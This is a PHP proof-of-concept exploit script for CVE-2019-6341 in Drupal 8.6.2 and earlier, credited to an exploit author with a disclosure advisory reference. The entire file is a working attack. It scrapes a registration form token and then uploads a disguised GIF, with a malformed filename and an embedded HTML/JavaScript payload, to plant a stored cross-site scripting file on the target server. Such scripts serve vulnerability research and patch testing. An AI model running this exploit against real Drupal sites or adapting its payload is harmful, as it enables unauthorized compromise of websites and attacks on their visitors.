<?php
/*
usage: php poc.php <target-ip>

Date: 1 March 2019
Exploit Author: TrendyTofu
Original Discoverer: Sam Thomas
Version: <= Drupal 8.6.2
Tested on: Drupal 8.6.2 Ubuntu 18.04 LTS x64 with ext4.
Tested not wokring on: Drupal running on MacOS with APFS
CVE : CVE-2019-6341
Reference: https://www.zerodayinitiative.com/advisories/ZDI-19-291/

*/

$host = $argv[1];
$port = $argv[2];

$pk =   "GET /user/register HTTP/1.1\r\n".
	"Host: ".$host."\r\n".
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".
	"Accept-Language: en-US,en;q=0.5\r\n".
	"Referer: http://".$host."/user/login\r\n".
	"Connection: close\r\n\r\n";

$fp = fsockopen($host,$port,$e,$err,1);
if (!$fp) {die("not connected");}
fputs($fp,$pk);
$out="";
while (!feof($fp)){
  $out.=fread($fp,1);
}
fclose($fp);

preg_match('/name="form_build_id" value="(.*)"/', $out, $match);
$formid = $match[1];
//var_dump($formid);
//echo "form id is:". $formid;
//echo $out."\n";
sleep(1);

$data = 
"Content-Type: multipart/form-data; boundary=---------------------------60928216114129559951791388325\r\n".
"Connection: close\r\n".
"\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"mail\"\r\n".
"\r\n".
"test324@example.com\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"name\"\r\n".
"\r\n".
"test2345\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"files[user_picture_0]\"; filename=\"xxx\xc0.gif\"\r\n".
"Content-Type: image/gif\r\n".
"\r\n".
"GIF\r\n".
"<HTML>\r\n".
"	<HEAD>\r\n".
"		<SCRIPT>alert(123);</SCRIPT>\r\n".
"	</HEAD>\r\n".
"	<BODY>\r\n".
"	</BODY>\r\n".
"</HTML>\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"user_picture[0][fids]\"\r\n".
"\r\n".
"\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"user_picture[0][display]\"\r\n".
"\r\n".
"1\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"form_build_id\"\r\n".
"\r\n".
//"form-KyXRvDVovOBjofviDPTw682MQ8Bf5es0PyF-AA2Buuk\r\n".
$formid."\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"form_id\"\r\n".
"\r\n".
"user_register_form\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"contact\"\r\n".
"\r\n".
"1\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"timezone\"\r\n".
"\r\n".
"America/New_York\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"_triggering_element_name\"\r\n".
"\r\n".
"user_picture_0_upload_button\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"_triggering_element_value\"\r\n".
"\r\n".
"Upload\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"_drupal_ajax\"\r\n".
"\r\n".
"1\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"ajax_page_state[theme]\"\r\n".
"\r\n".
"bartik\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"ajax_page_state[theme_token]\"\r\n".
"\r\n".
"\r\n".
"-----------------------------60928216114129559951791388325\r\n".
"Content-Disposition: form-data; name=\"ajax_page_state[libraries]\"\r\n".
"\r\n".
"bartik/global-styling,classy/base,classy/messages,core/drupal.ajax,core/drupal.collapse,core/drupal.timezone,core/html5shiv,core/jquery.form,core/normalize,file/drupal.file,system/base\r\n".
"-----------------------------60928216114129559951791388325--\r\n";

$pk = 	"POST /user/register?element_parents=user_picture/widget/0&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\n".
	"Host: ".$host."\r\n".
	"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\n".
	"Accept: application/json, text/javascript, */*; q=0.01\r\n".
	"Accept-Language: en-US,en;q=0.5\r\n".
	"X-Requested-With: XMLHttpRequest\r\n".
	"Referer: http://" .$host. "/user/register\r\n".
	"Content-Length: ". strlen($data). "\r\n".
	$data;

echo "uploading file, please wait...\n";

for ($i =1; $i <= 2; $i++){
$fp = fsockopen($host,$port,$e,$err,1);
if (!$fp) {die("not connected");}
fputs($fp,$pk);
$out="";
while (!feof($fp)){
  $out.=fread($fp,1);
}
fclose($fp);

// echo "Got ".$i."/2 500 errors\n";
// echo $out."\n";
sleep(1);
}

echo "please check /var/www/html/drupal/sites/default/files/pictures/YYYY-MM\n";

?>
